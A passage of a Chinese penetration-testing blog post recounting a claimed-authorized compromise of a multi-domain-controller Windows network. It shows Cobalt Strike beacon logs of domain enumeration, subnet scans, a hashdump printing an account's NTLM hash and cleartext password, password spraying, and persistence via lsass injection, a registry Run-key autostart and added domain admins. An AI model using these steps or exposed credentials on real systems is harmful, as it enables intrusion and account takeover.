<span class=\"token constant\">FPC</span><span class=\"token operator\">.</span><span class=\"token constant\">LOCAL</span><span class=\"token operator\">.</span>\n\nGroup name     Domain Controllers\nComment        All domain controllers in the domain\n\nMembers\n\n<span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">-</span>\n<span class=\"token constant\">AVV</span><span class=\"token operator\">-</span><span class=\"token class-name type-declaration\">DC1</span>$                 <span class=\"token constant\">AVV</span><span class=\"token operator\">-</span><span class=\"token class-name type-declaration\">DC2</span>$                 <span class=\"token constant\">AVV</span><span class=\"token operator\">-</span><span class=\"token class-name type-declaration\">DHDC01</span>$              \n<span class=\"token constant\">AVV</span><span class=\"token operator\">-</span><span class=\"token class-name type-declaration\">DHDC02</span>$                    <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h6 id=\"域管：\"><a href=\"#域管：\" class=\"headerlink\" title=\"域管：\"></a>域管：</h6><p>net group “domain admins” &#x2F;domain</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">fpcadmin                 mqd<span class=\"token operator\">.</span>ns          \nmqd<span class=\"token operator\">.</span>rmm                  mqd<span class=\"token operator\">.</span>tdv  <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h6 id=\"前直接归属的域控和主域控：\"><a href=\"#前直接归属的域控和主域控：\" class=\"headerlink\" title=\"前直接归属的域控和主域控：\"></a>前直接归属的域控和主域控：</h6><p>net time &#x2F;domain</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token punctuation\">[</span><span class=\"token number\">04</span><span class=\"token operator\">/</span><span class=\"token number\">26</span> <span class=\"token number\">18</span><span class=\"token punctuation\">:</span><span class=\"token number\">27</span><span class=\"token punctuation\">:</span><span class=\"token number\">52</span><span class=\"token punctuation\">]</span> beacon<span class=\"token operator\">></span> shell net time <span class=\"token operator\">/</span>domain\n<span class=\"token punctuation\">[</span><span class=\"token number\">04</span><span class=\"token operator\">/</span><span class=\"token number\">26</span> <span class=\"token number\">18</span><span class=\"token punctuation\">:</span><span class=\"token number\">27</span><span class=\"token punctuation\">:</span><span class=\"token number\">52</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">*</span><span class=\"token punctuation\">]</span> Tasked beacon to run<span class=\"token punctuation\">:</span> net time <span class=\"token operator\">/</span>domain\n<span class=\"token punctuation\">[</span><span class=\"token number\">04</span><span class=\"token operator\">/</span><span class=\"token number\">26</span> <span class=\"token number\">18</span><span class=\"token punctuation\">:</span><span class=\"token number\">27</span><span class=\"token punctuation\">:</span><span class=\"token number\">52</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">]</span> host called home<span class=\"token punctuation\">,</span> <span class=\"token argument-name\">sent</span><span class=\"token punctuation\">:</span> <span class=\"token number\">47</span> bytes\n<span class=\"token punctuation\">[</span><span class=\"token number\">04</span><span class=\"token operator\">/</span><span class=\"token number\">26</span> <span class=\"token number\">18</span><span class=\"token punctuation\">:</span><span class=\"token number\">27</span><span class=\"token punctuation\">:</span><span class=\"token number\">54</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">]</span> received output<span class=\"token punctuation\">:</span>\nCurrent time at \\\\<span class=\"token constant\">AVV</span><span class=\"token operator\">-</span><span class=\"token constant\">DC2</span><span class=\"token operator\">.</span><span class=\"token constant\">FPC</span><span class=\"token operator\">.</span><span class=\"token constant\">LOCAL</span> is <span class=\"token number\">4</span><span class=\"token operator\">/</span><span class=\"token number\">26</span><span class=\"token operator\">/</span><span class=\"token number\">2023</span> <span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token number\">27</span><span class=\"token punctuation\">:</span><span class=\"token number\">53</span> <span class=\"token constant\">AM</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可以发现当前是直接被DC2所归属，这里查下主控制器。这里直接使用CS插件来进行渗透</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token punctuation\">[</span><span class=\"token number\">04</span><span class=\"token operator\">/</span><span class=\"token number\">26</span> <span class=\"token number\">18</span><span class=\"token punctuation\">:</span><span class=\"token number\">31</span><span class=\"token punctuation\">:</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span><span class=\"token operator\">===</span><span class=\"token operator\">===</span><span class=\"token operator\">==</span> 查看主域控制器 <span class=\"token operator\">===</span><span class=\"token operator\">===</span><span class=\"token operator\">===</span><span class=\"token operator\">=</span>\n<span class=\"token punctuation\">[</span><span class=\"token number\">04</span><span class=\"token operator\">/</span><span class=\"token number\">26</span> <span class=\"token number\">18</span><span class=\"token punctuation\">:</span><span class=\"token number\">31</span><span class=\"token punctuation\">:</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">*</span><span class=\"token punctuation\">]</span> Tasked beacon to run<span class=\"token punctuation\">:</span> netdom query pdc\n<span class=\"token punctuation\">[</span><span class=\"token number\">04</span><span class=\"token operator\">/</span><span class=\"token number\">26</span> <span class=\"token number\">18</span><span class=\"token punctuation\">:</span><span class=\"token number\">31</span><span class=\"token punctuation\">:</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">]</span> host called home<span class=\"token punctuation\">,</span> <span class=\"token argument-name\">sent</span><span class=\"token punctuation\">:</span> <span class=\"token number\">47</span> bytes\n<span class=\"token punctuation\">[</span><span class=\"token number\">04</span><span class=\"token operator\">/</span><span class=\"token number\">26</span> <span class=\"token number\">18</span><span class=\"token punctuation\">:</span><span class=\"token number\">31</span><span class=\"token punctuation\">:</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">]</span> received output<span class=\"token punctuation\">:</span>\nPrimary domain controller <span class=\"token keyword\">for</span> the domain<span class=\"token punctuation\">:</span>\n\n<span class=\"token constant\">AVV</span><span class=\"token operator\">-</span><span class=\"token constant\">DC1</span>\nThe command completed successfully<span class=\"token operator\">.</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h6 id=\"定位域控的IP地址：\"><a href=\"#定位域控的IP地址：\" class=\"headerlink\" title=\"定位域控的IP地址：\"></a>定位域控的IP地址：</h6><p>这里经过ping之后发现，域控不是都在同一个网段，应该是如下的结构。</p>\n<p><img src=\"https://shs3.b.qianxin.com/attack_forum/2023/04/attach-9b73875e4651ae5b7c9d58fc59981e2e153bfb43.png\" alt=\"image.png\"></p>\n<h5 id=\"内网存活主机探测：\"><a href=\"#内网存活主机探测：\" class=\"headerlink\" title=\"内网存活主机探测：\"></a>内网存活主机探测：</h5><p>我先进行了DC段和本机段存活主机的探测，这里直接利用cs的插件（portscan）</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">portscan <span class=\"token number\">10.2</span><span class=\"token number\">.0</span><span class=\"token number\">.0</span><span class=\"token operator\">/</span><span class=\"token number\">24</span>\nportscan <span class=\"token number\">10.2</span><span class=\"token number\">.92</span><span class=\"token number\">.30</span><span class=\"token operator\">/</span><span class=\"token number\">24</span>\nportscan <span class=\"token number\">10.6</span><span class=\"token number\">.0</span><span class=\"token number\">.10</span><span class=\"token operator\">/</span><span class=\"token number\">24</span>\nportscan <span class=\"token number\">10.11</span><span class=\"token number\">.1</span><span class=\"token number\">.12</span><span class=\"token operator\">/</span><span class=\"token number\">24</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://shs3.b.qianxin.com/attack_forum/2023/04/attach-4253041ee85f9e8520ac7419dc54d16bf09be759.png\" alt=\"image.png\"></p>\n<h6 id=\"fscan扫描本机C段：\"><a href=\"#fscan扫描本机C段：\" class=\"headerlink\" title=\"fscan扫描本机C段：\"></a>fscan扫描本机C段：</h6><p>潦草的扫描到了ftp的匿名登陆，没有扫描到其他有用信息。这里就不放其他几个段的截图，都没扫描到啥有用的信息。</p>\n<p><img src=\"https://shs3.b.qianxin.com/attack_forum/2023/04/attach-7d3c43be4a193f345d3e97f6a56129a90d8ddb25.png\" alt=\"image.png\"></p>\n<h5 id=\"做hashdump：\"><a href=\"#做hashdump：\" class=\"headerlink\" title=\"做hashdump：\"></a>做hashdump：</h5><p>这里直接做完hashdump之后发现</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">msv <span class=\"token punctuation\">:</span>   \n     <span class=\"token punctuation\">[</span><span class=\"token number\">00000003</span><span class=\"token punctuation\">]</span> Primary\n     <span class=\"token operator\">*</span> Username <span class=\"token punctuation\">:</span> mqd<span class=\"token operator\">.</span>tdv \n     <span class=\"token operator\">*</span> Domain   <span class=\"token punctuation\">:</span> <span class=\"token constant\">FPC</span>\n     <span class=\"token operator\">*</span> <span class=\"token constant\">NTLM</span>     <span class=\"token punctuation\">:</span> <span class=\"token number\">7007</span>ebae678042f1cf112578ac43bf68\n     <span class=\"token operator\">*</span> <span class=\"token constant\">SHA1</span>     <span class=\"token punctuation\">:</span> <span class=\"token number\">712</span>ce4bf3a4a777582389d37f8d06158ed204f6b\n    tspkg <span class=\"token punctuation\">:</span> \n    wdigest <span class=\"token punctuation\">:</span>   \n     <span class=\"token operator\">*</span> Username <span class=\"token punctuation\">:</span> mqd<span class=\"token operator\">.</span>tdv \n     <span class=\"token operator\">*</span> Domain   <span class=\"token punctuation\">:</span> <span class=\"token constant\">FPC</span>\n     <span class=\"token operator\">*</span> Password <span class=\"token punctuation\">:</span> <span class=\"token constant\">QWE123456QE</span><span class=\"token operator\">!</span>@<span class=\"token comment\">#</span>\n    kerberos <span class=\"token punctuation\">:</span>  \n     <span class=\"token operator\">*</span> Username <span class=\"token punctuation\">:</span> mts<span class=\"token operator\">.</span>tdv\n     <span class=\"token operator\">*</span> Domain   <span class=\"token punctuation\">:</span> <span class=\"token constant\">FPC</span>\n     <span class=\"token operator\">*</span> Password <span class=\"token punctuation\">:</span> <span class=\"token constant\">QWE123456QE</span><span class=\"token operator\">!</span>@<span class=\"token comment\">#</span>\n    ssp <span class=\"token punctuation\">:</span>   \n    credman <span class=\"token punctuation\">:</span>   <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h1 id=\"内网横向（因为自己失误造成了比较繁琐的过程）\"><a href=\"#内网横向（因为自己失误造成了比较繁琐的过程）\" class=\"headerlink\" title=\"内网横向（因为自己失误造成了比较繁琐的过程）\"></a>内网横向（因为自己失误造成了比较繁琐的过程）</h1><p>因为前期已经看到了域管的账号就是mqd.tdv，这里直接做密码喷洒，这里转到msf中看下。上线了如此多的主机，同时，DC2子域控也进行了上线</p>\n<h3 id=\"第一天上线的主机：-MSF上\"><a href=\"#第一天上线的主机：-MSF上\" class=\"headerlink\" title=\"第一天上线的主机：(MSF上)\"></a>第一天上线的主机：(MSF上)</h3><p><img src=\"https://shs3.b.qianxin.com/attack_forum/2023/04/attach-c4dbcee02e942e82ffe1d42183aa1aa2ebba3a7d.png\" alt=\"image.png\"></p>\n<h4 id=\"CS上：（上线74台）\"><a href=\"#CS上：（上线74台）\" class=\"headerlink\" title=\"CS上：（上线74台）\"></a>CS上：（上线74台）</h4><p><img src=\"https://shs3.b.qianxin.com/attack_forum/2023/04/attach-539c1cc9d5b7e326860d4288bc52d36ec8afe501.png\" alt=\"image.png\"></p>\n<h3 id=\"小插曲：\"><a href=\"#小插曲：\" class=\"headerlink\" title=\"小插曲：\"></a>小插曲：</h3><p>因为渗透到域控的时候，在半夜2点半，所以在拿到DC2的权限的时候，就直接关掉电脑睡觉啦，没有进行留后门和做进程注入，导致第二天上线的时候执行命令出现如下界面。</p>\n<p><img src=\"https://shs3.b.qianxin.com/attack_forum/2023/04/attach-ed17c4607ddc02714eccb449ede179f75bc68500.png\" alt=\"image.png\"><br>这里的意思就是启动新进程的时候，系统无法将当前进程的令牌传递给新进程。也就是无法创建进程，所以只能通过其他方式来进行横向渗透。并且后期发现该域管理员密码已经进行修改。</p>\n<h3 id=\"DC挂掉之后的想到的几种方式：\"><a href=\"#DC挂掉之后的想到的几种方式：\" class=\"headerlink\" title=\"DC挂掉之后的想到的几种方式：\"></a>DC挂掉之后的想到的几种方式：</h3><h4 id=\"（1）抓去已控主机的hash看是否有其他域管登陆（失败）\"><a href=\"#（1）抓去已控主机的hash看是否有其他域管登陆（失败）\" class=\"headerlink\" title=\"（1）抓去已控主机的hash看是否有其他域管登陆（失败）\"></a>（1）抓去已控主机的hash看是否有其他域管登陆（失败）</h4><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">因为前面已经拿到了<span class=\"token number\">100</span>多台机子的权限，所以能想到的第一个思路就是把<span class=\"token number\">100</span>多台主机上的hash都进行一个抓起取，然后看是否可以抓到域管的账号，但是这里抓完之后会发现，没有一台域管是上线的，所以这里也比较无语。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h4 id=\"（2）利用CVE漏洞来进行横向（失败）\"><a href=\"#（2）利用CVE漏洞来进行横向（失败）\" class=\"headerlink\" title=\"（2）利用CVE漏洞来进行横向（失败）\"></a>（2）利用CVE漏洞来进行横向（失败）</h4><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">因为之前探测到<span class=\"token constant\">DC</span>的版本是windows2012 <span class=\"token constant\">R2</span>版本，所以想到了用ms17<span class=\"token operator\">-</span><span class=\"token number\">010</span>来进行内网横向，但是这里经过检测之后发现也没有ms17<span class=\"token operator\">-</span><span class=\"token number\">010</span>的漏洞，所以无法进行横向<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h4 id=\"（3）利用CVE漏洞来子域控（CVE-2020-1472）（失败）\"><a href=\"#（3）利用CVE漏洞来子域控（CVE-2020-1472）（失败）\" class=\"headerlink\" title=\"（3）利用CVE漏洞来子域控（CVE-2020-1472）（失败）\"></a>（3）利用CVE漏洞来子域控（CVE-2020-1472）（失败）</h4><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">这里经过尝试<span class=\"token constant\">CVE</span><span class=\"token operator\">-</span><span class=\"token number\">2020</span><span class=\"token operator\">-</span><span class=\"token number\">1472</span>漏洞，也没有发现可以横向上去，通过poc检测发现是fail的。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h4 id=\"（4）尝试攻击exchange服务器，来中继攻陷主机（失败）\"><a href=\"#（4）尝试攻击exchange服务器，来中继攻陷主机（失败）\" class=\"headerlink\" title=\"（4）尝试攻击exchange服务器，来中继攻陷主机（失败）\"></a>（4）尝试攻击exchange服务器，来中继攻陷主机（失败）</h4><p>这里就不放细节了，均以失败告终。</p>\n<h3 id=\"峰回路转：（DC2子域控上线）\"><a href=\"#峰回路转：（DC2子域控上线）\" class=\"headerlink\" title=\"峰回路转：（DC2子域控上线）\"></a>峰回路转：（DC2子域控上线）</h3><h4 id=\"DC2子域控上线过程：\"><a href=\"#DC2子域控上线过程：\" class=\"headerlink\" title=\"DC2子域控上线过程：\"></a>DC2子域控上线过程：</h4><p>这里经过一天的折磨之后发现，以上的几种方式不好使，但是想到了抓取机器用户的hash，通过构造密码表，来进行域管的密码喷洒，这里抓取了100多个的机器用户和几个域内用户做成密码表，重新进行内网横向。</p>\n<p>这里截图部分域内用户，做成密码表后直接进行喷洒，发现域管成功上线。</p>\n<p><img src=\"https://shs3.b.qianxin.com/attack_forum/2023/04/attach-cff06e232ed6077f7989a23bcc1ed1d29c7d9c93.png\" alt=\"image.png\"></p>\n<p><img src=\"https://shs3.b.qianxin.com/attack_forum/2023/04/attach-ad85a4c45fa3f4301186472d50d0ec3393fe7ab1.png\" alt=\"image.png\"></p>\n<p><img src=\"https://shs3.b.qianxin.com/attack_forum/2023/04/attach-95372142fc726952c761aa8e01932570d270d520.png\" alt=\"image.png\"></p>\n<h4 id=\"DC2子域权限维持：\"><a href=\"#DC2子域权限维持：\" class=\"headerlink\" title=\"DC2子域权限维持：\"></a>DC2子域权限维持：</h4><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">（<span class=\"token number\">1</span>）把当前进程注入到lsass进程中去。\n（<span class=\"token number\">2</span>）reg add <span class=\"token string double-quoted-string\">\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"</span> <span class=\"token operator\">/</span>v <span class=\"token string double-quoted-string\">\"start\"</span> <span class=\"token operator\">/</span>d <span class=\"token string double-quoted-string\">\"C:\\Windows\\Temp\\start.exe\"</span>  <span class=\"token comment\">//开机自启动</span>\n（<span class=\"token number\">3</span>）添加域管理员，因为已经拿到域管理员的权限，所以可以添加域管理员，来进行权限维持（这里直接通过lstar的插件来进行域管理员的添加）<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"其他域控上线\"><a href=\"#其他域控上线\" class=\"headerlink\" title=\"其他域控上线\"></a>其他域控上线</h3><p>这里也是一个小Tip，也是提供给大家的一个思路</p>\n<p>在有权限的情况下，可以添加域管理员，然后通过域管理员来进行横向其他域控（这是仅限于一个域），但是上面给出来了结构，这个域都是在一个域内的，所以的话，就可以进行添加管理员来上线。这里直接放后期上线的域控。</p>\n<p><img src=\"https://shs3.b.qianxin.com/attack_forum/2023/04/attach-971909d18a860f07555a6e82bd07d8df50df77bf.png\" alt=\"image.png\"></p>\n<h1 id=\"总结：\"><a href=\"#总结：\" class=\"headerlink\" title=\"总结：\"></a>总结：</h1><p>经过这次实战总结了很多小的技巧。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">（<span class=\"token number\">1</span>）可以通过添加域管理员来上线域内的所有主机\n（<span class=\"token number\">2</span>）可以通过cs来进行进程注入<span class=\"token keyword\">or</span>进程迁移，来实现本机system权限的获取\n（<span class=\"token number\">3</span>）此次实战的密码喷洒尤为重要，所以有机器用户的hash一定要进行抓取\n（<span class=\"token number\">4</span>）<span class=\"token constant\">SPN</span>服务横向可以通过打邮服来进行获取域控权限\n（<span class=\"token number\">5</span>）学习了权限维持的方法（开机自启动、winrm的横向和psexec的横向）\n\n恶补了一大波内网知识（比靶场来的实在）<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>不足之处：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">（<span class=\"token number\">1</span>）此次通过内网渗透，虽然打了邮件服务器，但是没有通过邮件服务器来拿下<span class=\"token constant\">DC</span>的权限。\n（<span class=\"token number\">2</span>）没有通过<span class=\"token constant\">SPN</span>票据横向拿下对应的服务器，比如<span class=\"token constant\">MSSQL</span>的和<span class=\"token constant\">CIFS</span>的\n（<span class=\"token number\">3</span>）此次没有利用白银票据进行横向（得重新学习）<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n","text":"接到朋友邀请，要对一个站点进行全面渗透，内网发现多DC主机，遂记录。 背景：接到朋友邀请，要进行一个授权站点的渗透，但是进去实际环境才发现是多域控主机。也学习了很多后渗透手法，比较受益匪浅。 前期渗透：打点：（任意文件上传）直接发现头像处任意文件上传，这里直接上传冰蝎即可。 ta...","link":"","photos":[],"count_time":{"symbolsCount":"13k","symbolsTime":"12 mins."},"categories":[],"tags":[{"name":"内网渗透","slug":"内网渗透","count":2,"path":"api/tags/内网渗透.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E8%83%8C%E6%99%AF%EF%BC%9A\"><span class=\"toc-text\">背景：</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E6%9C%9F%E6%B8%97%E9%80%8F%EF%BC%9A\"><span class=\"toc-text\">前期渗透：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%89%93%E7%82%B9%EF%BC%9A%EF%BC%88%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%89\"><span class=\"toc-text\">打点：（任意文件上传）</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#tasklist%E6%9F%A5%E7%9C%8B%E6%9D%80%E8%BD%AF\"><span class=\"toc-text\">tasklist查看杀软</span></a></li></ol></li></ol></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9A\"><span class=\"toc-text\">内网渗透：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E8%BE%B9%E7%BC%98%E6%9C%BA%E7%9A%84systeminfo\"><span class=\"toc-text\">边缘机的systeminfo</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E8%BE%B9%E7%BC%98%E6%9C%BA%E6%8F%90%E6%9D%83%EF%BC%9A%EF%BC%88%E5%88%A9%E7%94%A8%E7%83%82%E5%9C%9F%E8%B1%86%E7%9B%B4%E6%8E%A5%E6%8F%90%E4%B8%8A%E6%9D%83%E9%99%90%EF%BC%89\"><span class=\"toc-text\">边缘机提权：（利用烂土豆直接提上权限）</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%9A\"><span class=\"toc-text\">内网信息收集：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%85%88%E6%9F%A5%E7%9C%8Bip%EF%BC%8C%E7%9C%8B%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E5%8F%8C%E7%BD%91%E5%8D%A1%E6%9C%BA\"><span class=\"toc-text\">先查看ip，看是否存在双网卡机</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E5%92%8C%E5%9F%9F%E6%8E%A7%E7%9A%84%E6%9F%A5%E7%9C%8B%EF%BC%9A\"><span class=\"toc-text\">进行域管理员和域控的查看：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#%E5%9F%9F%E6%8E%A7%EF%BC%9A\"><span class=\"toc-text\">域控：</span></a></li><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#%E5%9F%9F%E7%AE%A1%EF%BC%9A\"><span class=\"toc-text\">域管：</span></a></li><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#%E5%89%8D%E7%9B%B4%E6%8E%A5%E5%BD%92%E5%B1%9E%E7%9A%84%E5%9F%9F%E6%8E%A7%E5%92%8C%E4%B8%BB%E5%9F%9F%E6%8E%A7%EF%BC%9A\"><span class=\"toc-text\">前直接归属的域控和主域控：</span></a></li><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#%E5%AE%9A%E4%BD%8D%E5%9F%9F%E6%8E%A7%E7%9A%84IP%E5%9C%B0%E5%9D%80%EF%BC%9A\"><span class=\"toc-text\">定位域控的IP地址：</span></a></li></ol></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B%EF%BC%9A\"><span class=\"toc-text\">内网存活主机探测：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#fscan%E6%89%AB%E6%8F%8F%E6%9C%AC%E6%9C%BAC%E6%AE%B5%EF%BC%9A\"><span class=\"toc-text\">fscan扫描本机C段：</span></a></li></ol></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%81%9Ahashdump%EF%BC%9A\"><span class=\"toc-text\">做hashdump：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%EF%BC%88%E5%9B%A0%E4%B8%BA%E8%87%AA%E5%B7%B1%E5%A4%B1%E8%AF%AF%E9%80%A0%E6%88%90%E4%BA%86%E6%AF%94%E8%BE%83%E7%B9%81%E7%90%90%E7%9A%84%E8%BF%87%E7%A8%8B%EF%BC%89\"><span class=\"toc-text\">内网横向（因为自己失误造成了比较繁琐的过程）</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B8%8A%E7%BA%BF%E7%9A%84%E4%B8%BB%E6%9C%BA%EF%BC%9A-MSF%E4%B8%8A\"><span class=\"toc-text\">第一天上线的主机：(MSF上)</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#CS%E4%B8%8A%EF%BC%9A%EF%BC%88%E4%B8%8A%E7%BA%BF74%E5%8F%B0%EF%BC%89\"><span class=\"toc-text\">CS上：（上线74台）</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%B0%8F%E6%8F%92%E6%9B%B2%EF%BC%9A\"><span class=\"toc-text\">小插曲：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#DC%E6%8C%82%E6%8E%89%E4%B9%8B%E5%90%8E%E7%9A%84%E6%83%B3%E5%88%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%EF%BC%9A\"><span class=\"toc-text\">DC挂掉之后的想到的几种方式：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%EF%BC%881%EF%BC%89%E6%8A%93%E5%8E%BB%E5%B7%B2%E6%8E%A7%E4%B8%BB%E6%9C%BA%E7%9A%84hash%E7%9C%8B%E6%98%AF%E5%90%A6%E6%9C%89%E5%85%B6%E4%BB%96%E5%9F%9F%E7%AE%A1%E7%99%BB%E9%99%86%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89\"><span class=\"toc-text\">（1）抓去已控主机的hash看是否有其他域管登陆（失败）</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%EF%BC%882%EF%BC%89%E5%88%A9%E7%94%A8CVE%E6%BC%8F%E6%B4%9E%E6%9D%A5%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89\"><span class=\"toc-text\">（2）利用CVE漏洞来进行横向（失败）</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%EF%BC%883%EF%BC%89%E5%88%A9%E7%94%A8CVE%E6%BC%8F%E6%B4%9E%E6%9D%A5%E5%AD%90%E5%9F%9F%E6%8E%A7%EF%BC%88CVE-2020-1472%EF%BC%89%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89\"><span class=\"toc-text\">（3）利用CVE漏洞来子域控（CVE-2020-1472）（失败）</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%EF%BC%884%EF%BC%89%E5%B0%9D%E8%AF%95%E6%94%BB%E5%87%BBexchange%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%8C%E6%9D%A5%E4%B8%AD%E7%BB%A7%E6%94%BB%E9%99%B7%E4%B8%BB%E6%9C%BA%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89\"><span class=\"toc-text\">（4）尝试攻击exchange服务器，来中继攻陷主机（失败）</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" 